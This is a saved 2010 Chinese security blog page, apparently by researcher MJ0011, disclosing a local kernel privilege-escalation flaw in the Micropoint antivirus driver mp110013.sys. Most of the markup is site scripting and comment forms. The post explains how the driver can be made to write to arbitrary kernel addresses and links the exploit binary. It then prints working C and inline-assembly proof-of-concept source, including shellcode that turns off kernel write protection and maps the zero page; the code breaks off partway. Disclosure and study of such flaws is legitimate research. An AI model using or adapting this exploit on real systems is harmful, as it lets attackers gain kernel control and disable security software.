@@ -1,0 +1,2470 @@
+<!--STATUS OK-->
+
+<html><head><meta http-equiv=content-type content="text/html; charset=gb2312"><title>微点主动防御 Mp110013.sys &#60;= 1.3.10123.0 本地内核权限提升漏洞_MJ0011的内核驱动研究所_百度空间      </title>
+
+<style type="text/css">
+
+.error{color:#FF0000;font-size:12px}
+.shareUser,.shareLastEditor{line-height:20px;color:#666666}
+.shareLastEditor{margin:5px 0 8px;}
+
+
+
+
+
+	
+
+
+
+
+
+</style>
+
+<script type="text/javascript" src="/ui/scripts/global.js"></script>
+<script type="text/javascript" src="http://img.baidu.com/js/tangram-1.1.0.js"></script>
+
+
+<script type="text/javascript">
+var Session = {
+    isLogin: ! true,
+    isHost: "",
+    userName: "MJ0011",   
+    userPortrait:'a0fb4d4a303031313b01',
+    spaceURL: "/mj0011",
+    spBasicURL:"mj0011",
+    spBasicURLEnc:"mj0011",
+    visitorName:    "",
+    visitorPortrait:'00000000',
+    isActive: '',   
+    visitorURL: "/index.html",        // 
+    pageURL: "http://hi.baidu.com/mj0011/blog/item/8eb590cba79fe0f152664fa4%2Ehtml",    
+    refer: "",
+    spToken: '1020688a49a8d1759c7bd7fb6e674103', 
+    spFriendDomain: 'http://frd.baidu.com',
+    spSpaceDomain: 'http://hi.baidu.com',
+    spPortraitDomain: '',
+    spSpaceStaticDomain: 'http://hi.baidu.com' 
+
+    ,isDrag:  false  
+    ,isProfile:  false   
+    };
+</script>
+
+<script language="javascript" src="/ui/scripts/dialog.js"></script>
+
+<script type="text/javascript" src="/ui/scripts/CommentEditor/BdEditor-mined.js?v=2.3"></script>
+
+<script type="text/javascript" src="/ui/scripts/spamuser/antiSpam.js"></script>
+
+<script LANGUAGE="JavaScript" src="/js/g_spjs.js"></script>
+
+<script language="javascript">
+
+<!--
+
+
+(function(){var A=109;function C(D){var F="nslog__"+(new Date()).getTime();var E=window[F]=new Image();E.onload=(E.onerror=function(){window[F]=null});E.src="http://nsclick.baidu.com/v.gif?pid="+A+"&url="+encodeURIComponent(D)+"&type=0&_t="+Math.random();E=null}function B(F){F=F||event;var E=F.srcElement||F.target;if(E.nodeType!=1){E=E.parentNode}while(E&&E.tagName&&E.tagName.toUpperCase()!="A"){E=E.parentNode}if(E&&E.tagName&&E.tagName.toUpperCase()=="A"){if(E.protocol.indexOf("http")==0&&!/^([\w-]+\.)*?baidu\.com/i.test(E.host)){var D=E.href;setTimeout(function(){C(D)},1)}}E=null}if(document.attachEvent){document.attachEvent("onmousedown",B);window.attachEvent("onunload",function(){document.detachEvent("onmousedown",B)})}else{document.addEventListener("mousedown",B,false);window.addEventListener("unload",function(){document.removeEventListener("mousedown",B,false)},false)}})();
+
+var allkey="";
+
+var i=0;
+
+var flag=0;
+
+function setpv(allnum)
+
+{
+
+	var num = allnum.split('_');
+
+	document.getElementById("result").innerHTML=num[0];
+
+}
+
+
+
+function checkMail(s)
+
+{
+
+  	var pattern=/\w+@\w+\.[a-z]+/;
+
+  	if(pattern.test(s))
+
+    {
+
+       return true;
+
+    }
+
+  	else
+
+   {
+
+      return false;
+
+   }
+
+}
+
+
+
+
+
+function checkeandu(eanduid)
+
+{
+
+	var eanduvalue=G(eanduid).value;
+
+	var len=bytes(eanduvalue);
+
+	if(len>128)
+
+	{
+
+		showErr(2,"您输入的网址或邮箱太长，请保持在128字节以内。");
+
+		return false;
+
+	}
+
+	else
+
+	{
+
+		 return true;
+
+	}
+
+
+
+}
+
+
+
+function cmtdel(str)
+
+{
+
+	var pop=new Popup({ contentType:3,isReloadOnClose:false,width:340,height:80});
+
+	pop.setContent("title","删除评论");
+
+	pop.setContent("confirmCon","您确定要彻底删除这条评论吗？");
+
+	pop.setContent("callBack",delCallback2);
+
+	pop.setContent("parameter",{fid:str,popup:pop});
+
+	pop.build();
+
+	pop.show();
+
+	return false;
+
+}
+
+function delCallback2(para)
+
+{
+
+	var o_pop=para["popup"];
+
+	o_pop.config.contentType=1;
+
+	o_pop.setContent("contentUrl","");
+
+	o_pop.reBuild();
+
+	G(para["fid"]).target=o_pop.iframeIdName;
+
+	eval("document."+para["fid"]).submit();
+
+}
+
+
+
+String.prototype.byteLength = function() {
+
+    return this.replace(/[^\u0000-\u007f]/g,"\u0061\u0061").length;
+
+}
+
+
+
+function checkname(strid)
+
+{
+
+	var ele=document.getElementById(strid);
+
+	var len=bytes(ele.value);
+
+	if(len>49)
+
+	{
+
+		showErr(1,"您输入的姓名太长，请保持在49字节以内。");
+
+		return false;
+
+	}
+
+	else
+
+	{
+
+		if(len==0)
+
+		{
+
+			document.getElementById(strid).value="匿名网友";
+
+		}
+
+		 return true;
+
+	}
+
+
+
+}
+
+
+
+function checktext(textid)
+
+{
+
+        var tempStr='';
+
+        var isLightFont=false;
+
+		if(editor&&textid=="spBlogCmtText"){
+
+			//document.getElementById("spBlogCmtText").value=editor.getHtml();
+
+			tempStr=editor.getHtml();
+
+			tempStr=tempStr.replace(/<span style="filter:glow\(color=#([0-9a-z]{3,6}),strength=2\);height:0px;color:#([0-9a-z]{3,6})">/ig,'');
+
+			tempStr=tempStr.replace(/<\/span>/ig,'');
+
+			document.getElementById("spBlogCmtText").value=tempStr;
+
+            isLightFont=!(tempStr==editor.getHtml());
+
+        }
+
+		document.getElementById(textid).value=trimlr(textid);
+
+		var str=trimrn(textid);
+
+		len=str.length;
+
+		if(len==0 || ((/^[\s,　]+$/gi).test(str)) )
+
+		{
+
+			showErr(3,"您必须输入评论内容，请检查。");
+
+			return false;
+
+		}
+
+		else
+
+        {
+
+                len=str.byteLength();
+
+                var maxLength=isLightFont?916:1000;
+
+				if(len > maxLength)
+
+				{
+
+					showErr(3,"您输入的评论内容太长，请保持在500字以内。");
+
+					return false;
+
+				}
+
+				if(editor&&textid=="spBlogCmtText"){
+
+					document.getElementById("spBlogCmtText").value=editor.getHtml();
+
+					document.getElementById(textid).value=trimlr(textid);
+
+				}
+
+
+
+			return true;
+
+		}
+
+}
+
+
+
+function showErr(index,str)
+
+{
+
+	G(index+"_err").style.display="";
+
+	G(index+"_err_con").innerHTML=str;
+
+}
+
+function hidErr(index)
+
+{
+
+	G(index+"_err").style.display="none";
+
+	G(index+"_err_con").innerHTML="";
+
+}
+
+
+
+function alertPop(tit,con)
+
+{
+
+	var pop=new Popup({ contentType:4,isReloadOnClose:false,width:340,height:80});
+
+	pop.setContent("title",tit);
+
+	pop.setContent("alertCon",con);
+
+	pop.build();
+
+	pop.show();
+
+}
+
+
+
+function cmtfull()
+
+{
+
+	var cnum=8;
+
+	if(cnum>=50000)
+
+	{
+
+		alertPop("发表评论","单篇日志评论数最多为50000条.");
+
+		return false;
+
+	}
+
+	else
+
+	{
+
+		return true;
+
+	}
+
+}
+
+
+
+function checkcmtform()
+
+{
+
+	if(checkname("spBlogCmtor")&&checkeandu("spBlogCmtURL")&&checktext("spBlogCmtText")&&cmtfull())
+
+	{
+
+		submitForm();
+
+		return true;
+
+	}
+
+	else
+
+	{
+
+		return false;
+
+	}
+
+}
+
+
+
+var g_pop=null;
+
+function submitForm()
+
+{
+
+	g_pop=new Popup({ contentType:1,isReloadOnClose:false,width:340,height:80});
+
+	g_pop.setContent("title","添加评论");
+
+	g_pop.setContent("contentUrl","");
+
+	g_pop.setContent("someDisabledBtn","btn_ok");
+
+	g_pop.build();
+
+	G("popFormSubmit").target=g_pop.iframeIdName;
+
+	g_pop.show();
+
+}
+
+
+
+function g_close_pop()
+
+{
+
+	g_pop.close();
+
+}
+
+
+
+function formatonlinpic()
+
+{
+
+var picobj=document.getElementsByName("onlinepic");
+
+var picnum=picobj.length;
+
+
+
+	for(var i=0;i<picnum;i++)
+
+	{
+
+		if(picobj[i].width>200)
+
+		{
+
+			picobj[i].width=200;
+
+		}
+
+		if(picobj[i].height>200)
+
+		{
+
+			picobj[i].height=200;
+
+		}
+
+	}
+
+    try{document.getElementById("btn_ok").disabled = "";}catch(e){}
+
+}
+
+
+
+function addToFavor(){
+
+var blogTitle='微点主动防御 Mp110013.sys &#60;= 1.3.10123.0 本地内核权限提升漏洞'.replace(/&#39;/g,'\'');
+
+window.open('http://cang.baidu.com/do/add?it='+encodeURIComponent(blogTitle+'_百度空间')+'&iu='+encodeURIComponent(location.href)+'&fr=sp#nw=1','_s','scrollbars=no,width=600,height=450,right=75,top=20,status=no,resizable=yes');
+
+return false;
+
+}
+
+function addToiTieba(){
+    var blogTitle='微点主动防御 Mp110013.sys &#60;= 1.3.10123.0 本地内核权限提升漏洞'.replace(/&#39;/g,'\'');
+    window.open('http://tieba.baidu.com/i/sys/share?link='+encodeURIComponent('http://hi.baidu.com/mj0011/blog/item/8eb590cba79fe0f152664fa4.html')+'&type=text&title='+encodeURIComponent(blogTitle)+'&content=');
+}
+
+function addToShare(){
+    window.open('http://apps.hi.baidu.com/share/?url='+encodeURIComponent('http://hi.baidu.com/mj0011/blog/item/8eb590cba79fe0f152664fa4.html'));
+}
+
+
+var isIE = /*@cc_on!@*/false;
+
+function tracker(did,a){
+
+	return function(){
+
+		var t=new Date().getTime();
+
+		var href=a.href;
+
+        if(isIE){
+
+            var r = /href\s*=\s*("|')?([^\s]*)\1/gi;
+
+            if(r.test(a.outerHTML))
+
+                href = RegExp.$2;
+
+        }
+
+        new Image().src = "http://hi.baidu.com/sys/statlog/1.gif?m=" + did + "&v=" + encodeURIComponent(href) + "&c=" + encodeURIComponent(location.href) + "&t="+t;
+
+	}
+
+}
+
+
+
+function tracker_init(did){
+
+	var _s=document.getElementById(did);
+
+	var as = _s.getElementsByTagName('A');
+
+	for(var i = 0, j = as.length; i < j; i ++){
+
+		var a = as[i];
+
+		if(isIE){
+
+			a.attachEvent("onclick", tracker(did,a));
+
+		}else{
+
+			a.addEventListener("click", tracker(did,a), false);
+
+		}
+
+	}
+
+}
+
+
+
+
+
+/* some functions for cmt-reply */
+        var g_cmtorInfo = [];
+        function goCmtReply(cmtPorID){
+            cmtreply(g_cmtorInfo[cmtPorID],cmtPorID);
+        }
+		function cmtreply(cmtName,cmtPorID)
+
+		{
+
+			cmtName=cmtName.replace(/<|>/g,"");
+
+			window.location.hash="#send";
+
+			var cmtForm=document.form1;
+
+			cmtForm.cm.value="3";
+
+			if(!cmtForm.spReferTarget)
+
+			{
+
+				var ipt=document.createElement("input");
+
+				ipt.type="hidden";
+
+				ipt.name="spReferTarget";
+
+				ipt.value=cmtPorID;
+
+				cmtForm.appendChild(ipt);
+
+			}else cmtForm.spReferTarget.value=cmtPorID;
+
+
+
+
+
+			 //G("reTitle").innerHTML="回复"+cmtName+"：";
+
+			 G("cancleReLink").style.display="";
+
+			 cmtForm.btn_ok.value="回复评论";
+
+
+
+
+
+			 try{
+
+				editor.window.focus();
+
+                editor.window.document.body.innerHTML="回复"+cmtName+"：";
+
+
+
+                var w = editor.window;
+
+				if(w.getSelection){
+
+					var d = w.document;
+
+					var s = w.getSelection();
+
+					var r = d.createRange();
+
+					r.setStartAfter(d.body.firstChild);
+
+					r.setEndAfter(d.body.lastChild);
+
+					s.removeAllRanges();
+
+					s.addRange(r);
+
+				}
+
+			}catch(e){
+
+			 		try{
+
+				 		cmtForm.getElementsByTagName("textarea")[0].focus();
+
+				 		cmtForm.getElementsByTagName("textarea")[0].value="回复"+cmtName+"：";
+
+				 	}catch(e){}
+
+			}
+
+		}
+
+
+
+		function canclereply()
+
+		{
+
+			var cmtForm=document.form1;
+
+			cmtForm.cm.value="1";
+
+			try{cmtForm.removeChild(cmtForm.spReferTarget);}catch(e){}
+
+			/*
+
+			try{
+
+					var cmt=cmtForm.getElementsByTagName("textarea")[0]
+
+					cmt.value="";
+
+					cmt.focus();
+
+			}catch(e){}
+
+			*/
+
+
+
+			try{
+
+					var ed=editor.window.document.body;
+
+					ed.innerHTML="";
+
+					editor.window.focus();
+
+				}catch(e){
+
+					var cmt=cmtForm.getElementsByTagName("textarea")[0];
+
+					cmt.value="";
+
+					cmt.focus();
+
+			}
+
+
+
+			G("cancleReLink").style.display="none";
+
+			cmtForm.btn_ok.value="发表评论";
+
+		}
+
+
+
+		function gotoreply()
+
+		{//to checking whether reply cmt
+
+			if( window.location.hash.indexOf("&re=1")<0) return;
+
+			var cmtID=window.location.hash.split("&")[0].replace("#","");
+
+			var cmtlinks=document.getElementsByTagName("a");
+
+			for(var i=0,n=cmtlinks.length;i<n;i++)
+
+			{
+
+				if(cmtlinks[i].name==cmtID){ var rename=cmtlinks[i].getAttribute("rename");  repid=cmtlinks[i].getAttribute("repid"); break;}
+
+			}
+
+			if(typeof(rename)!="undefined"){
+
+				cmtreply(rename, repid);
+
+			}
+
+		}
+
+
+
+//-->
+
+</script>
+
+
+<script type="text/javascript">
+
+    /*<![CDATA[*/
+
+
+
+window.onerror=function(){return true;}
+
+
+
+var RelatedDocData = null, GetAndEval = false;
+
+(function(){
+
+	var xhr = BdAjax.getXHR();
+
+	if(xhr == null){
+
+		RelatedDocData = -1;
+
+		return;
+
+	}
+
+
+
+	xhr.open("GET", "/sys/search?type=8&word=%CE%A2%B5%E3%D6%F7%B6%AF%B7%C0%D3%F9%20Mp110013%2Esys%20%26%2360%3B%3D%201%2E3%2E10123%2E0%20%B1%BE%B5%D8%C4%DA%BA%CB%C8%A8%CF%DE%CC%E1%C9%FD%C2%A9%B6%B4&item=8eb590cba79fe0f152664fa4&t=" + new Date().getTime(), true);
+
+	xhr.onreadystatechange = function(){
+
+		if(xhr.readyState == 4){
+
+			if(xhr.status == 0 || xhr.status == 200){
+
+				if(GetAndEval){
+
+					eval(xhr.responseText);
+
+				}else{
+
+					RelatedDocData = xhr.responseText;
+
+				}
+
+			}
+
+		}
+
+	}
+
+	xhr.send(null);
+
+})();
+
+/*]]>*/
+
+</script>
+
+
+
+</head>
+
+<body onLoad="formatonlinpic();">
+
+<center>
+
+<script type="text/javascript">
+/*<![CDATA[*/
+if(top.location != self.location){
+	top.location = self.location;
+}
+var myref = encodeURIComponent("http://hi.baidu.com/mj0011/blog/item/8eb590cba79fe0f152664fa4%2Ehtml");
+/*]]>*/
+</script>
+<link rel="stylesheet" type="text/css" href="/ui/css/mods.css" />
+
+<link rel="stylesheet" type="text/css" href="/mj0011/css/item/85c0b50f0e5b3cedaa645774.css" />
+
+<link rel="stylesheet" type="text/css" href="/space.css" />
+<style type="text/css">
+/*<![CDATA[*/
+
+#usrbar{padding:4px 10px 3px 0;font-size:12px;height:19px;line-height:19px;color:#000000;font-family:Arial;text-align:right;background:#ffffff;filter:alpha(opacity=65);-moz-opacity:0.5;width:auto !important;width:100%;letter-spacing:normal}
+#usrbar a,#usrbar a:link,#usrbar a:visited{color:#0000CC;text-decoration:underline}
+#ft{clear:both;height:20px;line-height:20px;color:#666666;font-size:12px;font-family:Arial;text-align:center}
+#ft a,#ft a:link,#ft a:visited{color:#7777CC;text-decoration:underline}
+#usrbar,#usrbar a,#usrbar a:link,#usrbar a:visited,#ft,#ft a,#ft a:link,#ft a:visited{letter-spacing:normal}
+/*]]>*/
+</style>
+
+
+
+<div id="usrbar"><nobr>
+
+			<a id="hi_index" href="http://hi.baidu.com" target="_blank">百度空间</a>&nbsp;|&nbsp;<a href="http://www.baidu.com/" target="_blank">百度首页</a>&nbsp;<script type="text/javascript">
+		document.write('| <a href="https://passport.baidu.com/?login&tpl=sp&tpl_reg=sp&u=http://hi.baidu.com' + encodeURIComponent('/mj0011/blog/item/8eb590cba79fe0f152664fa4%2Ehtml') + '"  onclick="BdUtil.relogin(); return false;">登录</a>');
+		</script>
+		
+</nobr></div>
+
+
+    
+    <script type="text/javascript">
+            BdUtil.ns_tracker("usrbar","nm_20091208_topNavClick");
+    </script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+function set_cookie_4_bdtip(index/* start from one */, value){
+	var bdtip = document.cookie.match(/(^| )BDTIP=([^;]*)(;|$)/);
+	if(!bdtip){
+		bdtip=new Array(index);
+		for(var i=0,n=bdtip.length;i<n;i++)
+		{
+			if(bdtip[i]=="" || bdtip[i]==null)  bdtip[i]=0;
+			if(i == index - 1){
+				bdtip[i] = value;
+			}
+		}
+	}else{
+	bdtip = bdtip[2].split('-');
+	if(index > bdtip.length)  bdtip.length= index;
+	for(var i = 0, j = bdtip.length; i < j; i ++){
+		if(bdtip[i]=="" || bdtip[i]==null) bdtip[i]=0;
+		if(i == index - 1){
+			bdtip[i] = value;
+		}
+	}
+	}
+	bdtip = bdtip.join('-');
+	document.cookie = "BDTIP=" + bdtip+ ";expires=Wed, 28-Nov-37 01:45:46 GMT;path=/;";
+}
+</script>
+
+<div id="main" align="left">
+
+<!--[if IE]>
+<script>
+var objmain = document.getElementById("main");
+function updatesize(){ var bodyw = window.document.body.offsetWidth; if(bodyw <= 790) objmain.style.width="772px"; else if(bodyw >= 1016) objmain.style.width="996px"; else objmain.style.width="100%"; }
+updatesize(); window.onresize = updatesize;
+</script>
+<![endif]-->
+
+	<div id="header">
+
+	<div class="lc"><div class="rc"></div></div>
+<div class="tit"><a href="/mj0011" class="titlink" title="MJ0011的空间 http://hi.baidu.com/mj0011">MJ0011的内核驱动研究所</a></div>
+<div class="desc">内核技术、Rootkit/Anti-Rootkit、网络安全</div>
+<div id="tabline">&nbsp;</div>
+
+	<div id="tab"><a href="/mj0011">主页</a><a href="/mj0011/blog" class="on">博客</a><a href="/mj0011/album">相册</a><span>|</span><a href="/mj0011/profile">个人档案</a>
+
+	<span>|</span><a href="/mj0011/friends">好友</a>
+
+
+
+
+
+
+
+	</div>
+
+</div>
+
+
+
+<div class="stage">
+
+<div class="stagepad">
+
+<div style="width:100%">
+
+
+
+
+
+	
+
+
+
+	<table width="100%" border="0" cellspacing="0" cellpadding="0" class="modth">
+
+	<tr><td class="modtl" width="7">&nbsp;</td>
+
+	<td class="modtc" nowrap><div class="modhead"><span class="modtit">查看文章</span></div></td>
+
+	<td class="modtc" nowrap align="right"></td>
+
+	<td class="modtr" width="7">&nbsp;</td>
+
+	</tr></table>
+
+
+
+<div id="m_blog" class="modbox" style="overflow-x:hidden;">
+
+<div class="tit">
+
+微点主动防御 Mp110013.sys &#60;= 1.3.10123.0 本地内核权限提升漏洞</div>
+
+<div class="date">2010-04-13  21:05</div>
+
+
+
+
+<table style="table-layout:fixed;width:100%"><tr><td><div id="blog_text" class="cnt"  ><p>漏洞涉及产品:微点主动防御100323.1.2.10581.0278.r1及以下版本</p>
+<p>mp110013.sys &lt;= 1.3.10123.0</p>
+<p>漏洞影响：</p>
+<p>通过漏洞攻击者在最低系统权限下执行内核权限代码，从而可以突破任何存在的安全防护软件，包括沙盘、主动防御、杀毒软件、防火墙、HIPS、UAC和系统安全设置</p>
+<p>漏洞详细原理和利用方法</p>
+<p>微点主动防御的驱动程序Mp110003.sys中存在这样一个功能，允许用户提供PspCreateProcessNotifyRoutineCount和PspCreateProcessNotifyRoutine 相对于ntoskrnl的偏移，提供后，微点将在mp110003中处理这个偏移，从偏移地址获取PspCreateProcessNotifyRoutine数组，并寻找自己在其中注册的项目，将此项目位置作为数值A</p>
+<p>接着在其对于NtCreateProcessEx的钩子和系统线程中，高频率检查PspCreateProcessNotifyRoutineCount中的数值是否小于数值A，如果小于，则关闭系统内存写保护，并将数值A写回到PspCreateProcessNotifyRoutineCount指向的内存</p>
+<p>由于偏移地址可随意指定，因此用户态的程序可以使微点驱动写入任意内核地址，但这个漏洞的利用条件实际是比较苛刻的，需要满足下面3个条件：</p>
+<p>(1).由于微点会开启系统线程去访问PspCreateProcessNotifyRoutineCount和PspCreateProcessNotifyRoutine，因此我们不能指定一个位于用户态内存的地址。</p>
+<p>(2).PspCreateProcessNotifyRoutine又必须满足要存在一项微点自己的回调函数，这是比较困难的，因为NotifyRoutine的结构在XP下有一点麻烦，最好是使用原始的地址了。</p>
+<p>(3).PspCreateProcessNotifyRoutineCount指向的内存中的数值必须小于当前真正的回调函数个数，又能被某一个RING3程序可以调用的系统调用访问或执行，因为系统只允许最多8个回调函数，所以最终写入数值只可能是1~8之间，因此必须申请0号地址内存去执行。</p>
+<p>这里我使用了PspLegoNotifyRoutine这个东东，这个回调首先系统通常是空的，满足条件3，同时可以通过线程的结束来控制，这个通知条件是KThread-&gt;LegoData不为空，由于这个地址通常也是空的，因此我们同样可以利用这个漏洞来将其设为非空，最后由于我们需要申请0号地址来执行代码，因此不能用进程主线程干这个事，因为LegoNotfiy 执行时机在PspExitThread中比较晚，那时如果是主线程销毁，进程的VM已经被销毁了。</p>
+<p>利用程序:http://mj0011.ys168.com 漏洞演示目录下mp0day1.exe</p>
+<p>漏洞利用的结果是在内核态向系统所有进程的ntdll.dll基址偏移0x8写入&ldquo;6543&rdquo;</p>
+<p><strong>这里利用程序有一些平台相关的处理，懒得做兼容了，目前只支持XP。</strong></p>
+<p>利用代码如下：</p>
+<p>// mp0day1.cpp : Defines the entry point for the console application.<br>
+//</p>
+<p>#include &quot;stdafx.h&quot;<br>
+#include &quot;windows.h&quot;<br>
+#include &quot;shlwapi.h&quot;<br>
+#pragma comment(lib , &quot;shlwapi.lib&quot;)</p>
+<p>VOID __declspec(naked) ShellCode()<br>
+{<br>
+__asm<br>
+{<br>
+&nbsp;&nbsp;  pushad<br>
+&nbsp;&nbsp;  mov eax , cr0 <br>
+&nbsp;&nbsp;  push eax<br>
+&nbsp;&nbsp;  and eax, 0xFFFEFFFF<br>
+&nbsp;&nbsp;  mov cr0 , eax<br>
+&nbsp;&nbsp;  cli <br>
+&nbsp;&nbsp;  mov eax , 0xAAAA5555<br>
+&nbsp;&nbsp;  mov dword ptr[eax] , 0x33343536<br>
+&nbsp;&nbsp;  sti<br>
+&nbsp;&nbsp;  pop eax<br>
+&nbsp;&nbsp;  mov cr0 , eax<br>
+&nbsp;&nbsp;  popad<br>
+&nbsp;&nbsp;  ret 0x4<br>
+}<br>
+}<br>
+VOID __declspec(naked) nopfunc()<br>
+{<br>
+__asm{mov edi ,edi<br>
+&nbsp;&nbsp;  nop };<br>
+}<br>
+enum { SystemModuleInformation = 11,<br>
+&nbsp;&nbsp;  SystemHandleInformation = 16 };<br>
+typedef struct {<br>
+&nbsp;&nbsp;&nbsp;  ULONG&nbsp;&nbsp;  Unknown1;<br>
+&nbsp;&nbsp;&nbsp;  ULONG&nbsp;&nbsp;  Unknown2;<br>
+&nbsp;&nbsp;&nbsp;  PVOID&nbsp;&nbsp;  Base;<br>
+&nbsp;&nbsp;&nbsp;  ULONG&nbsp;&nbsp;  Size;<br>
+&nbsp;&nbsp;&nbsp;  ULONG&nbsp;&nbsp;  Flags;<br>
+&nbsp;&nbsp;&nbsp;  USHORT Index;<br>
+&nbsp;&nbsp;&nbsp;  USHORT NameLength;<br>
+&nbsp;&nbsp;&nbsp;  USHORT LoadCount;<br>
+&nbsp;&nbsp;&nbsp;  USHORT PathLength;<br>
+&nbsp;&nbsp;&nbsp;  CHAR&nbsp;&nbsp;&nbsp;  ImageName[256];<br>
+} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;</p>
+<p>typedef struct {<br>
+&nbsp;&nbsp;&nbsp;  ULONG&nbsp;&nbsp;  Count;<br>
+&nbsp;&nbsp;&nbsp;  SYSTEM_MODULE_INFORMATION_ENTRY Module[1];<br>
+} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;<br>
+PVOID GetInfoTable(ULONG ATableType)<br>
+{<br>
+ULONG mSize = 0x4000;<br>
+PVOID mPtr = NULL;<br>
+LONG status;<br>
+HMODULE hlib = GetModuleHandle(&quot;ntdll.dll&quot;);<br>
+PVOID pZwQuerySystemInformation = GetProcAddress(hlib , &quot;ZwQuerySystemInformation&quot;);<br>
+do<br>
+{<br>
+&nbsp;&nbsp;  mPtr = malloc(mSize);<br>
+&nbsp;&nbsp;  if (mPtr)<br>
+&nbsp;&nbsp;  {<br>
+&nbsp;&nbsp;&nbsp;  __asm<br>
+&nbsp;&nbsp;&nbsp;  {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;  push 0<br>
+&nbsp;&nbsp;&nbsp;&nbsp;  push mSize<br>
+&nbsp;&nbsp;&nbsp;&nbsp;  push mPtr<br>
+&nbsp;&nbsp;&nbsp;&nbsp;  push ATableType<br>
+&nbsp;&nbsp;&nbsp;&nbsp;  call pZwQuerySystemInformation<br>
+&nbsp;&nbsp;&nbsp;&nbsp;  mov status , eax<br>
+&nbsp;&nbsp;&nbsp;  }<br>
+&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;  }<br>
+&nbsp;&nbsp;  else<br>
+&nbsp;&nbsp;  {<br>
+&nbsp;&nbsp;&nbsp;  return NULL;<br>
+&nbsp;&nbsp;  }<br>
+&nbsp;&nbsp;  if (status == 0xc0000004)<br>
+&nbsp;&nbsp;  {<br>
+&nbsp;&nbsp;&nbsp;  free(mPtr);<br>
+&nbsp;&nbsp;&nbsp;  mSize = mSize * 2;<br>
+&nbsp;&nbsp;  }<br>
+} while (status == 0xc0000004);<br>
+<br>
+if (status == 0)<br>
+{<br>
+&nbsp;&nbsp;  return mPtr;<br>
+}<br>
+<br>
+free(mPtr);<br>
+return NULL;<br>
+}<br>
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {<br>
+&nbsp;&nbsp;&nbsp;  USHORT UniqueProcessId;<br>
+&nbsp;&nbsp;&nbsp;  USHORT CreatorBackTraceIndex;<br>
+&nbsp;&nbsp;&nbsp;  UCHAR ObjectTypeIndex;<br>
+&nbsp;&nbsp;&nbsp;  UCHAR HandleAttributes;<br>
+&nbsp;&nbsp;&nbsp;  USHORT HandleValue;<br>
+&nbsp;&nbsp;&nbsp;  PVOID Object;<br>
+&nbsp;&nbsp;&nbsp;  ULONG GrantedAccess;<br>
+} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;</p>
+<p>typedef struct _SYSTEM_HANDLE_INFORMATION {<br>
+&nbsp;&nbsp;&nbsp;  ULONG NumberOfHandles;<br>
+&nbsp;&nbsp;&nbsp;  SYSTEM_HANDLE_TABLE_ENTRY_INFO Information[ 1 ];<br>
+} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;</p>
+<p>DWORD WINAPI LegoThread(LPVOID lpThreadParameter)<br>
+{<br>
+while(TRUE)<br>
+{<br>
+&nbsp;&nbsp;  Sleep(0x1000);</p>
+<p>}<br>
+return 0 ; <br>
+}<br>
+int main(int argc, char* argv[])<br>
+{<br>
+DWORD dwVersion = 0;<br>
+DWORD dwMajorVersion = 0;<br>
+DWORD dwMinorVersion = 0; <br>
+<br>
+<br>
+&nbsp;&nbsp;&nbsp;  dwVersion = GetVersion();<br>
+<br>
+&nbsp;&nbsp;&nbsp;  // Get the Windows version.<br>
+<br>
+&nbsp;&nbsp;&nbsp;  dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));<br>
+&nbsp;&nbsp;&nbsp;  dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));</p>
+<p>if (dwMajorVersion != 5 || dwMinorVersion != 1)<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;POC for XP only\n&quot;);<br>
+&nbsp;&nbsp;  getchar();<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}</p>
+<p>printf(&quot;Micropoint Mp110003.sys &lt;= 1.3.10123.0 Local Privilege Escalation Vulnerability POC\n&quot;<br>
+&nbsp;&nbsp;  &quot;by MJ0011 <a href="mailto:th_decoder@126.com n">th_decoder@126.com\n</a>&quot;<br>
+&nbsp;&nbsp;  &quot;Press Enter\n&quot;);</p>
+<p>getchar();<br>
+&nbsp;&nbsp;&nbsp;  <br>
+HANDLE hDev = CreateFile(&quot;<a>\\\\.\\mp110013</a>&quot; , <br>
+&nbsp;&nbsp;  0 ,<br>
+&nbsp;&nbsp;  FILE_SHARE_READ | FILE_SHARE_WRITE , <br>
+&nbsp;&nbsp;  0,<br>
+&nbsp;&nbsp;  OPEN_EXISTING,0,<br>
+&nbsp;&nbsp;  0<br>
+&nbsp;&nbsp;  );</p>
+<p>if (hDev == INVALID_HANDLE_VALUE)<br>
+{<br>
+&nbsp;&nbsp;  printf(&quot;cannot open device %u\n&quot; , GetLastError());<br>
+&nbsp;&nbsp;  return 0 ; <br>
+}</p>
+<p><br>
+&nbsp;&nbsp;&nbsp;  PVOID BaseAddress&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  = (PVOID) 1;<br>
+&nbsp;&nbsp;&nbsp;  ULONG RegionSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  = (ULONG) 0;<br>
+PVOID pNtAllocateVirtualMemory = GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;) , &quot;NtAllocateVirtualMemory&quot;);<br>
+PVOID pNtFreeVirtualMemory = GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;) , &quot;NtFreeVirtualMemory&quot;);</p>
+<p>ULONG status ; <br>
+<br>
+&nbsp;&nbsp;&nbsp;  __asm<br>
+{<br>
+&nbsp;&nbsp;  push 0x8000<br>
+&nbsp;&nbsp;  lea eax , RegionSize<br>
+&nbsp;&nbsp;  push eax<br>
+&nbsp;&nbsp;  lea eax , BaseAddress<br>
+&nbsp;&nbsp;  push eax<br>
+&nbsp;&nbsp;  push 0xffffffff<br>
+&nbsp;&nbsp;  call pNtFreeVirtualMemory<br>
+&nbsp;&nbsp;  mov RegionSize,0x1000<br>
+&nbsp;&nbsp;  push 0x40<br>
+&nbsp;&nbsp;  push 0x3000<br>
+&nbsp;&nbsp;  lea eax , RegionSize<br>
